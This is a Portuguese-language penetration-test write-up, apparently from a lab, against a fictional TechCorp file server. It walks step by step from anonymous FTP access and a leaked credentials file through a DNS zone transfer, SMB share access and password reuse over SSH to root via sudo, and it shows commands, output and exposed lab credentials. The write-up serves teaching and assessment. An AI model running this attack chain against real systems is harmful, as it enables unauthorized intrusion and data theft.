# Pentest — Servidor Corporativo TechCorp (`srv-files01` / 10.10.0.30)

## 1. Recon de porta

```bash
(pentester㉿srv2040813)-[~/evidencias]
└─$ nmap -sT -Pn -n -sV -p 21,22,53,139,445 10.10.0.30
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 11:43 +0000
Nmap scan report for 10.10.0.30
Host is up (0.00050s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
53/tcp  open  domain      ISC BIND 9.18.49-1~deb12u2 (Debian Linux)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

serviços atualizados sem vulnerabilidades aparentes, vamos verificar as
de configuraçao:

- o FTP permite login anônimo?
- O DNS deixa fazer transferência de zona?
- O SMB tem share acessível como guest?
- O SNMP usa a community padrão?

Nota: o smbd entregou as info do SO durante a varredura da rede.

## 2. Primeira: explorando falhas de configuração

*esse vsftpd aceita o usuário anonymous sem senha?*

```bash
nmap -sT -Pn -n -p21 --script ftp-anon 10.10.0.30

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 12:11 +0000
Nmap scan report for 10.10.0.30
Host is up (0.000014s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 101      104          4096 Oct 07 03:18 internal
|_drwxr-xr-x    2 101      104          4096 Oct 07 03:18 pub
```

usei um script NSE do nmap,para automatizar a checagem do login anônimo,
com isso encontrei dois repositorios expostos. a pasta pub costuma ser lixo publico,
vou acessar a pasta internal usando modo passivo.

```bash
curl -s --connect-timeout 10 --user anonymous: "ftp://10.10.0.30/internal/"

-rw-r--r--    1 101      104            76 Oct 07 03:18 contacts.txt
-rw-r--r--    1 101      104            73 Oct 07 03:18 vpn_creds.txt
```

Encontrado dois arquivos que podem conter informaçoes sensiveis,
vou extrair as informaçoes de ambas  para analise.

```bash
(pentester㉿srv2040813)-[~/evidencias]
└─$ curl -sS --user anonymous: "ftp://10.10.0.30/internal/"
-rw-r--r--    1 101      104            76 Oct 07 03:18 contacts.txt
-rw-r--r--    1 101      104            73 Oct 07 03:18 vpn_creds.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ curl -sS --user anonymous: "ftp://10.10.0.30/pub/"                    
-rw-r--r--    1 101      104            49 Oct 07 03:18 readme.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ curl -sS --user anonymous: "ftp://10.10.0.30/internal/vpn_creds.txt" -o vpn_creds.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ ls                                                                    
desc-001.txt  desc-003.txt  desc-005.txt             desc-008.txt
desc-002.txt  desc-004.txt  desc-006-007-sqlmap.txt  vpn_creds.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ curl -sS --user anonymous: "ftp://10.10.0.30/internal/contacts.txt" -o contacts.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ cat vpn_creds.txt
vpn_user=admin.backup
vpn_pass=B4ckup@2024
vpn_server=vpn.techcorp.local

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ cat contacts.txt                                                      
IT Contact: jsilva@techcorp.local
Backup admin: admin.backup@techcorp.local

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ curl -sS --user anonymous: "ftp://10.10.0.30/pub/readme.txt" -o readme_pub.txt

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ cat readme_pub.txt
Servidor de arquivos corporativo - TechCorp Ltda
```

Três achados que podem ser util:

1. Credencial *admin.backup / B4ckup@2024.* onde mais essa senha funciona?" Esse host tem SSH (22) aberto.
   Considerando que muita gente reusa senha, vamos testar essa senha no SSH futuramente.

2. Usuário da empresa: *jsilva e admin.backup, ambos @techcorp.local*. (sobrenome+inicial / nome.função)
  pode servir para enumeraçao e spraying mais tarde.

3. O achado : *vpn.techcorp.local*, Pode ser um nome de domínio interno.
   Esse host tem DNS (porta 53) aberto, isso leva ao próximo ataque.

## 3. Segunda: transferência de zona DNS (AXFR)

VOu usar a ferramenta *dig* para mapear o servidor e ver se ele me entrega o dump completo do servidor

```bash
(pentester㉿srv2040813)-[~/evidencias]
└─$ dig @10.10.0.30 techcorp.local AXFR                                   

; <<>> DiG 9.20.27-2-Debian <<>> @10.10.0.30 techcorp.local AXFR
; (1 server found)
;; global options: +cmd
techcorp.local.         86400   IN      SOA     ns1.techcorp.local. admin.techcorp.local. 2024010101 3600 1800 604800 86400
techcorp.local.         86400   IN      NS      ns1.techcorp.local.
admin.techcorp.local.   86400   IN      CNAME   srv-files01.techcorp.local.
backup.techcorp.local.  86400   IN      A       10.10.0.30
dev.techcorp.local.     86400   IN      A       10.10.0.90
gitlab.techcorp.local.  86400   IN      A       10.10.0.80
intranet.techcorp.local. 86400  IN      A       10.10.0.30
jenkins.techcorp.local. 86400   IN      A       10.10.0.70
mail.techcorp.local.    86400   IN      A       10.10.0.60
ns1.techcorp.local.     86400   IN      A       10.10.0.30
srv-db01.techcorp.local. 86400  IN      A       10.10.0.40
srv-files01.techcorp.local. 86400 IN    A       10.10.0.30
srv-web01.techcorp.local. 86400 IN      A       10.10.0.20
staging.techcorp.local. 86400   IN      A       10.10.0.91
vpn.techcorp.local.     86400   IN      A       10.10.0.50
techcorp.local.         86400   IN      SOA     ns1.techcorp.local. admin.techcorp.local. 2024010101 3600 1800 604800 86400
;; Query time: 4 msec
;; SERVER: 10.10.0.30#53(10.10.0.30) (TCP)
;; WHEN: Fri Oct 09 13:07:36 UTC 2026
;; XFR size: 16 records (messages 1, bytes 456)
```

Jackpot. O servidor despejou a zona inteira me entregando novos hosts que
a varredura nao viu,"XFR size: 16 records". Isso é uma das piores misconfigurações de DNS.

backup.techcorp.local aponta pro 10.10.0.30 o host atual

Com os apelidos dele: backup, intranet, ns1, srv-files01, admin (CNAME).

Um único host com cinco funções. Isso é intel: comprometer essa caixa derruba vários papéis de uma vez

## 4. Terceira: entrar nos shares — e a hora do encadeamento

```bash
smbclient -L //10.10.0.30 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shared          Disk      Public Shared Folder
        it-dept         Disk      IT Department
        IPC$            IPC       IPC Service (TechCorp File Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.10.0.30 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

minha enumeração deu certo; o servidor só não me deixou cair pro protocolo inseguro.

Vou usar ler os files e caso estejam restritos usarei
as credenciais que consegui para a entrar

```bash
──(pentester㉿srv2040813)-[~/evidencias]
└─$ smbclient //10.10.0.30/shared -N -c 'ls'
  .                                   D        0  Wed Oct  7 03:18:53 2026
  ..                                  D        0  Wed Oct  7 03:18:53 2026
  employees.csv                       N       96  Wed Oct  7 03:18:53 2026
  budget_q3.txt                       N       30  Wed Oct  7 03:18:53 2026

                206103752 blocks of size 1024. 184497564 blocks available

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ smbclient //10.10.0.30/it-dept -N -c 'ls'
tree connect failed: NT_STATUS_ACCESS_DENIED

┌──(pentester㉿srv2040813)-[~/evidencias]
└─$ smbclient //10.10.0.30/it-dept -U 'admin.backup%B4ckup@2024' -c 'ls'
  .                                   D        0  Wed Oct  7 03:18:53 2026
  ..                                  D        0  Wed Oct  7 03:18:53 2026
  deploy_procedure.txt                N      113  Wed Oct  7 03:18:53 2026

                206103752 blocks of size 1024. 184497560 blocks available
```

Conseguir acessar uma pasta mas a outra deu acesso negado mas com as credenciais
o sistema me revelou mau um informaçao

vou gravar e ler os arquivos

```bash
─(pentester㉿srv2040813)-[~/evidencias]
└─$ cat employees.csv budget_q3.txt deploy_procedure.txt                      
employee_id,name,salary
1001,Jose Silva,8500
1002,Maria Rodrigues,12000
1003,Admin Backup,15000
Budget Q3 2024 - Confidencial
Procedimento de deploy:
1. SSH no servidor
2. user: admin.backup pass: B4ckup@2024
3. cd /opt/deploy && ./run.sh
```

tive acesso a informaçoes pessoais e mais uma confirmaçao da senha do ssh

cadeia de ataque ate aqui

```text
nmap (portas)
   └─ FTP anônimo ─ vpn_creds.txt ──┐
   └─ DNS AXFR (mapa da rede)       ├─ admin.backup / B4ckup@2024
   └─ SMB it-dept ─ deploy_proc ────┘        │
                                             ▼
                                   SSH em 10.10.0.30  ← o "e daí?" / impacto
```

## 5. Acesso ao servidor via SSH

vou agora acessar o servidor

```bash
(pentester㉿srv2040813)-[~/evidencias]
└─$ ssh admin.backup@10.10.0.30
The authenticity of host '10.10.0.30 (10.10.0.30)' can't be established.
ED25519 key fingerprint is: SHA256:rHaMgOJTDWTp0zojTjUkfhAu0hRmlEs6Ctp/zEv73KQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.30' (ED25519) to the list of known hosts.
***********************************************
  TechCorp Internal Server - srv-files01
  Authorized access only.
  OS: Debian 12 | Admin: admin.backup
***********************************************
admin.backup@10.10.0.30's password: 
Linux srv-files01 6.18.12+kali-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.utf-8)
admin.backup@srv-files01:~$ 
```

consegui acesso atraves do admin com as credenciais obtidas em ambos arquivos

```bash
admin.backup@srv-files01:~$ id
uid=1002(admin.backup) gid=1002(admin.backup) groups=1002(admin.backup),27(sudo)
admin.backup@srv-files01:~$ hostname; pwd; ls -la
srv-files01
/home/admin.backup
total 20
drwxr-xr-x 2 admin.backup admin.backup 4096 Oct  7 03:16 .
drwxr-xr-x 1 root         root         4096 Oct  7 03:16 ..
-rw-r--r-- 1 admin.backup admin.backup  220 May  7 20:33 .bash_logout
-rw-r--r-- 1 admin.backup admin.backup 3526 May  7 20:33 .bashrc
-rw-r--r-- 1 admin.backup admin.backup  807 May  7 20:33 .profile
admin.backup@srv-files01:~$ sudo -l
[sudo] password for admin.backup: 
Matching Defaults entries for admin.backup on srv-files01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User admin.backup may run the following commands on srv-files01:
    (ALL : ALL) ALL
```

Fim de jogo nesse host. Olha o que o sudo -l te entregou:

```text
(ALL        :  ALL   )  ALL
 │              │        │
 │              │        └─ QUALQUER comando
 │              └─ a partir de qualquer host
 └─ como QUALQUER usuário (inclusive root)
```

admin.backup pode rodar qualquer comando como qualquer usuário — inclusive root

## 6. A cadeia completa — de FTP anônimo a root

```text
nmap  →  FTP anônimo (sem senha)
             └─ vpn_creds.txt ─► admin.backup / B4ckup@2024
                     │
       SMB it-dept ──┤ (mesma senha abre share restrito)
       deploy_proc ──┘ (documenta o login SSH)
                     ▼
             SSH em srv-files01
                     ▼
             sudo -l → (ALL:ALL) ALL
                     ▼
                  ROOT  ◄── comprometimento total
```

Isso é um achado crítico: partindo de um login anônimo sem senha, um atacante chega a root no file server.
Cada elo é uma misconfiguration isolada — mas encadeadas, derrubam a caixa inteira.

```bash
admin.backup@srv-files01:~$ sudo -i
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.utf-8)
root@srv-files01:~# id; hostname
uid=0(root) gid=0(root) groups=0(root)
srv-files01
root@srv-files01:~# 
```
